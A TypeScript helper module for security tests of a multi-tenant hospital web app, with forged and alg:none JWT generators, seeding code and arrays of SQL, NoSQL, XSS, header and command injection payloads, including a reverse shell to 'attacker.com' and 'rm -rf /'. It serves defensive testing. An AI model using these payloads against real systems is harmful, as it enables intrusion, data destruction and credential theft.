/**
 * Security Test Helpers
 *
 * Shared utilities for security penetration tests — provides auth tokens,
 * HTTP helpers, payload generators, and guards.
 *
 * ⚠️  PRODUCTION GUARD: Every test file must call `assertNotProduction()`.
 *
 * Prerequisites:
 *   - Running dev server: `yarn dev`
 *   - PostgreSQL reachable via DATABASE_URL
 *   - JWT_SECRET env var set
 */

import { PrismaClient } from '@prisma/client';
import { PrismaPg } from '@prisma/adapter-pg';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { v4 as uuidv4 } from 'uuid';

// ---------------------------------------------------------------------------
// Production guard
// ---------------------------------------------------------------------------

export function assertNotProduction(): void {
  if (process.env.NODE_ENV === 'production') {
    throw new Error(
      '🛑 Security tests must NEVER run against production!\n' +
      '   Set NODE_ENV=development or NODE_ENV=test.',
    );
  }
}

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

export const BASE_URL = process.env.TEST_BASE_URL || 'http://localhost:3000';
const JWT_SECRET = process.env.JWT_SECRET || 'test-jwt-secret-for-integration-tests-32chars!!';

// ---------------------------------------------------------------------------
// Prisma client
// ---------------------------------------------------------------------------

let _prisma: PrismaClient | null = null;

export function getPrisma(): PrismaClient {
  if (!_prisma) {
    const connectionString = process.env.DATABASE_URL;
    if (!connectionString) {
      throw new Error('[Security Tests] DATABASE_URL is not set.');
    }
    const adapter = new PrismaPg({ connectionString });
    _prisma = new PrismaClient({ adapter, log: ['error'] });
  }
  return _prisma;
}

export async function disconnectPrisma(): Promise<void> {
  if (_prisma) {
    await _prisma.$disconnect();
    _prisma = null;
  }
}

// ---------------------------------------------------------------------------
// JWT helpers
// ---------------------------------------------------------------------------

export function generateTestToken(
  userId: string,
  email: string,
  role: string,
  sessionId: string,
  activeTenantId?: string,
): string {
  return jwt.sign(
    {
      userId,
      email,
      role,
      sessionId,
      activeTenantId,
      entitlements: { sam: true, health: true, edrac: true, cvision: true },
    },
    JWT_SECRET,
    { expiresIn: '1h' },
  );
}

export function generateExpiredToken(userId: string, email: string, role: string): string {
  return jwt.sign(
    { userId, email, role, sessionId: uuidv4(), activeTenantId: 'expired' },
    JWT_SECRET,
    { expiresIn: '-1s' },
  );
}

export function generateTamperedToken(
  userId: string,
  email: string,
  overrides: Record<string, unknown>,
): string {
  // Sign with the WRONG secret — simulates payload tampering
  return jwt.sign(
    { userId, email, role: 'admin', sessionId: uuidv4(), ...overrides },
    'WRONG-SECRET-ATTACKER-KEY',
    { expiresIn: '1h' },
  );
}

export function generateAlgNoneToken(payload: Record<string, unknown>): string {
  // Create a JWT with alg:none (classic attack vector)
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const body = Buffer.from(JSON.stringify({
    ...payload,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600,
  })).toString('base64url');
  return `${header}.${body}.`;
}

// ---------------------------------------------------------------------------
// HTTP helpers
// ---------------------------------------------------------------------------

export async function rawFetch(
  path: string,
  options: RequestInit = {},
): Promise<Response> {
  const url = path.startsWith('http') ? path : `${BASE_URL}${path}`;
  return fetch(url, { ...options, redirect: 'manual' });
}

export async function authenticatedFetch(
  path: string,
  token: string,
  options: RequestInit = {},
): Promise<Response> {
  const url = path.startsWith('http') ? path : `${BASE_URL}${path}`;
  const headers = new Headers(options.headers || {});
  headers.set('Cookie', `auth-token=${token}; activePlatform=health`);
  if (!headers.has('Content-Type') && options.body) {
    headers.set('Content-Type', 'application/json');
  }
  return fetch(url, { ...options, headers, redirect: 'manual' });
}

export async function authGet(path: string, token: string): Promise<Response> {
  return authenticatedFetch(path, token, { method: 'GET' });
}

export async function authPost(path: string, token: string, body: unknown): Promise<Response> {
  return authenticatedFetch(path, token, {
    method: 'POST',
    body: JSON.stringify(body),
  });
}

export async function authDelete(path: string, token: string): Promise<Response> {
  return authenticatedFetch(path, token, { method: 'DELETE' });
}

export async function authPut(path: string, token: string, body: unknown): Promise<Response> {
  return authenticatedFetch(path, token, {
    method: 'PUT',
    body: JSON.stringify(body),
  });
}

export async function unauthFetch(path: string, options: RequestInit = {}): Promise<Response> {
  const url = path.startsWith('http') ? path : `${BASE_URL}${path}`;
  const headers = new Headers(options.headers || {});
  if (!headers.has('Content-Type') && options.body) {
    headers.set('Content-Type', 'application/json');
  }
  return fetch(url, { ...options, headers, redirect: 'manual' });
}

// ---------------------------------------------------------------------------
// Injection payloads
// ---------------------------------------------------------------------------

export const SQL_INJECTION_PAYLOADS = [
  "' OR 1=1--",
  "'; DROP TABLE users;--",
  "' UNION SELECT null,null,null--",
  "1; SELECT * FROM information_schema.tables--",
  "admin'--",
  "' OR ''='",
  "1' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--",
  "'; EXEC xp_cmdshell('whoami');--",
];

export const NOSQL_INJECTION_PAYLOADS = [
  { $gt: '' },
  { $ne: null },
  { $regex: '.*' },
  { $where: 'this.password.length > 0' },
  { $or: [{ a: 1 }, { b: 1 }] },
];

export const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '<svg onload=alert(1)>',
  '"><script>alert(document.cookie)</script>',
  "'-alert(1)-'",
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '${7*7}', // Template injection
];

export const COMMAND_INJECTION_PAYLOADS = [
  '; rm -rf /',
  '$(whoami)',
  '`id`',
  '| cat /etc/passwd',
  '&& curl attacker.com',
  '; nc -e /bin/sh attacker.com 4444',
];

export const HEADER_INJECTION_PAYLOADS = [
  'value\r\nX-Injected: true',
  'value\nSet-Cookie: stolen=true',
  'value\r\nHTTP/1.1 200 OK\r\n',
];

// ---------------------------------------------------------------------------
// Seed helpers (lighter than integration — focus on security)
// ---------------------------------------------------------------------------

export interface SecurityTestContext {
  tenantId: string;
  tenantKey: string;
  tenantBId: string;
  tenantBKey: string;
  adminToken: string;
  doctorToken: string;
  nurseToken: string;
  viewerToken: string;
  patientToken: string;
  receptionistToken: string;
  tenantBAdminToken: string;
  adminUserId: string;
  doctorUserId: string;
  adminEmail: string;
  doctorEmail: string;
  userPassword: string;
  userIds: string[];
  sessionIds: string[];
}

const TEST_PASSWORD = 'SecTestP@ss2026!';

export async function seedSecurityTestData(): Promise<SecurityTestContext> {
  const prisma = getPrisma();
  const pw = await bcrypt.hash(TEST_PASSWORD, 10);
  const now = new Date();
  const oneYear = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000);
  const tenantAKey = `sec-test-a-${Date.now()}`;
  const tenantBKey = `sec-test-b-${Date.now()}`;

  // Tenant A
  const tenantA = await prisma.tenant.create({
    data: {
      tenantId: tenantAKey, name: 'Security Test Hospital A', status: 'ACTIVE',
      planType: 'ENTERPRISE', entitlementSam: true, entitlementHealth: true,
      entitlementEdrac: true, entitlementCvision: true, maxUsers: 50,
      subscriptionEndsAt: oneYear,
    },
  });
  await prisma.subscriptionContract.create({
    data: {
      tenantId: tenantA.id, status: 'active', enabledSam: true, enabledTheaHealth: true,
      enabledCvision: true, enabledEdrac: true, maxUsers: 50, currentUsers: 0,
      planType: 'enterprise', enabledFeatures: {}, storageLimit: BigInt(1_000_000_000),
      subscriptionStartsAt: now, subscriptionEndsAt: oneYear, gracePeriodEnabled: false,
    },
  });

  // Tenant B
  const tenantB = await prisma.tenant.create({
    data: {
      tenantId: tenantBKey, name: 'Security Test Hospital B', status: 'ACTIVE',
      planType: 'ENTERPRISE', entitlementSam: true, entitlementHealth: true,
      entitlementEdrac: true, entitlementCvision: true, maxUsers: 50,
      subscriptionEndsAt: oneYear,
    },
  });
  await prisma.subscriptionContract.create({
    data: {
      tenantId: tenantB.id, status: 'active', enabledSam: true, enabledTheaHealth: true,
      enabledCvision: true, enabledEdrac: true, maxUsers: 50, currentUsers: 0,
      planType: 'enterprise', enabledFeatures: {}, storageLimit: BigInt(1_000_000_000),
      subscriptionStartsAt: now, subscriptionEndsAt: oneYear, gracePeriodEnabled: false,
    },
  });

  const userIds: string[] = [];
  const sessionIds: string[] = [];

  const PERMISSION_MAP: Record<string, string[]> = {
    admin: [
      'opd.dashboard.view', 'opd.visit.view', 'opd.visit.create', 'opd.visit.edit',
      'opd.doctor.encounter.view', 'opd.doctor.encounter.edit', 'orders.hub.view', 'orders.hub.create',
      'er.register.create', 'er.triage.edit', 'er.beds.assign', 'er.encounter.view', 'er.disposition.update',
      'ipd.live-beds.view', 'ipd.live-beds.edit', 'ipd.admin.view', 'ipd.admin.edit',
      'lab.orders.view', 'lab.orders.create', 'lab.specimens.view', 'lab.results.view',
      'pharmacy.dispense.view', 'pharmacy.prescriptions.create', 'pharmacy.dispense.create', 'pharmacy.view',
      'billing.payment.view', 'billing.payment.create', 'billing.invoices.view',
      'admin.users.view', 'admin.users.create', 'admin.users.edit', 'admin.tenants.view', 'admin.settings.view',
    ],
    doctor: [
      'opd.dashboard.view', 'opd.visit.view', 'opd.visit.create', 'opd.visit.edit',
      'opd.doctor.encounter.view', 'opd.doctor.encounter.edit', 'orders.hub.view', 'orders.hub.create',
      'er.encounter.view', 'er.triage.edit', 'er.disposition.update',
      'ipd.live-beds.view', 'ipd.live-beds.edit', 'lab.orders.view', 'lab.orders.create', 'lab.results.view',
      'pharmacy.prescriptions.create', 'billing.invoices.view',
    ],
    nurse: [
      'opd.dashboard.view', 'opd.visit.view',
      'er.register.create', 'er.triage.edit', 'er.beds.assign', 'er.encounter.view',
      'ipd.live-beds.view', 'ipd.live-beds.edit', 'lab.specimens.view', 'pharmacy.dispense.view',
    ],
    receptionist: [
      'opd.dashboard.view', 'opd.visit.view', 'opd.visit.create',
      'er.register.create', 'er.encounter.view',
      'billing.payment.view', 'billing.payment.create', 'billing.invoices.view',
    ],
    patient: ['portal.profile.view', 'portal.appointments.view', 'portal.results.view'],
    viewer: ['opd.dashboard.view', 'opd.visit.view'],
  };

  async function createUser(
    tenantUUID: string,
    tenantKey: string,
    role: string,
    dbRole: string,
    dept: string,
    deptKey: string,
  ): Promise<{ id: string; email: string; token: string; sessionId: string }> {
    const id = uuidv4();
    const email = `${role}.${tenantKey}@sec.thea.local`;
    const sessionId = uuidv4();

    await prisma.user.create({
      data: {
        id, email, password: pw,
        firstName: role.charAt(0).toUpperCase() + role.slice(1), lastName: 'SecTest',
        role: dbRole as string, tenantId: tenantUUID, isActive: true,
        department: dept,
        permissions: PERMISSION_MAP[role] || [],
      },
    });
    await prisma.session.create({
      data: {
        sessionId, userId: id, tenantId: tenantUUID, activeTenantId: tenantUUID,
        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
        userAgent: 'SecurityTest/1.0', ip: '127.0.0.1',
      },
    });
    // Link session to user so validateSession passes
    await prisma.user.update({
      where: { id },
      data: { activeSessionId: sessionId },
    });
    try {
      await (prisma as Record<string, unknown>).tenantUser.create({
        data: {
          userId: id, tenantId: tenantUUID, role: dbRole as string,
          permissions: PERMISSION_MAP[role] || [],
          areas: [deptKey, 'OPD', 'ER', 'IPD', 'ORDERS', 'RESULTS', 'BILLING', 'REGISTRATION', 'NOTIFICATIONS'],
          isActive: true,
        },
      });
    } catch { /* TenantUser may not exist */ }

    userIds.push(id);
    sessionIds.push(sessionId);

    const jwtRole = role === 'admin' ? 'admin' : 'staff';
    const token = generateTestToken(id, email, jwtRole, sessionId, tenantKey);
    return { id, email, token, sessionId };
  }

  const admin = await createUser(tenantA.id, tenantAKey, 'admin', 'ADMIN', 'Administration', 'ADMIN');
  const doctor = await createUser(tenantA.id, tenantAKey, 'doctor', 'STAFF', 'OPD', 'OPD');
  const nurse = await createUser(tenantA.id, tenantAKey, 'nurse', 'STAFF', 'ER', 'ER');
  const receptionist = await createUser(tenantA.id, tenantAKey, 'receptionist', 'STAFF', 'Registration', 'REGISTRATION');
  const patient = await createUser(tenantA.id, tenantAKey, 'patient', 'VIEWER', 'Portal', 'PORTAL');
  const viewer = await createUser(tenantA.id, tenantAKey, 'viewer', 'VIEWER', 'Viewer', 'VIEWER');
  const tenantBAdmin = await createUser(tenantB.id, tenantBKey, 'admin', 'ADMIN', 'Administration', 'ADMIN');

  return {
    tenantId: tenantA.id, tenantKey: tenantAKey,
    tenantBId: tenantB.id, tenantBKey: tenantBKey,
    adminToken: admin.token, doctorToken: doctor.token, nurseToken: nurse.token,
    viewerToken: viewer.token, patientToken: patient.token, receptionistToken: receptionist.token,
    tenantBAdminToken: tenantBAdmin.token,
    adminUserId: admin.id, doctorUserId: doctor.id,
    adminEmail: admin.email, doctorEmail: doctor.email,
    userPassword: TEST_PASSWORD,
    userIds, sessionIds,
  };
}

export async function cleanupSecurityTestData(ctx: SecurityTestContext | undefined): Promise<void> {
  if (!ctx?.tenantId) return;
  const prisma = getPrisma();
  const tenantIds = [ctx.tenantId, ctx.tenantBId];
  try {
    await prisma.opdEncounter.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await prisma.encounterCore.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await prisma.patientMaster.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await (prisma as Record<string, unknown>).erEncounter?.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await (prisma as Record<string, unknown>).ipdEpisode?.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await (prisma as Record<string, unknown>).labOrder?.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await (prisma as Record<string, unknown>).prescription?.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await (prisma as Record<string, unknown>).payment?.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await (prisma as Record<string, unknown>).ordersHub?.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await (prisma as Record<string, unknown>).notification?.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await (prisma as Record<string, unknown>).auditLog?.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await (prisma as Record<string, unknown>).tenantUser?.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await prisma.session.deleteMany({ where: { userId: { in: ctx.userIds } } }).catch(() => {});
    await prisma.user.deleteMany({ where: { id: { in: ctx.userIds } } }).catch(() => {});
    await prisma.subscriptionContract.deleteMany({ where: { tenantId: { in: tenantIds } } }).catch(() => {});
    await prisma.tenant.deleteMany({ where: { id: { in: tenantIds } } }).catch(() => {});
  } catch (err) {
    console.warn('[security cleanup] partial failure:', (err as Error).message);
  }
}

// ---------------------------------------------------------------------------
// Server health check
// ---------------------------------------------------------------------------

export async function ensureServerRunning(): Promise<void> {
  try {
    const res = await fetch(`${BASE_URL}/api/auth/me`, { method: 'GET' });
    if (res.status >= 500) throw new Error(`Server error: ${res.status}`);
  } catch (err: unknown) {
    const e = err as Record<string, unknown>;
    const cause = e.cause as Record<string, unknown> | undefined;
    if (cause?.code === 'ECONNREFUSED' || (e.message as string)?.includes('fetch failed')) {
      throw new Error(
        `\n\n🛑 Security tests require a running dev server.\n` +
        `   Start it with:  yarn dev\n` +
        `   Then re-run:    yarn test:security\n\n`,
      );
    }
  }
}
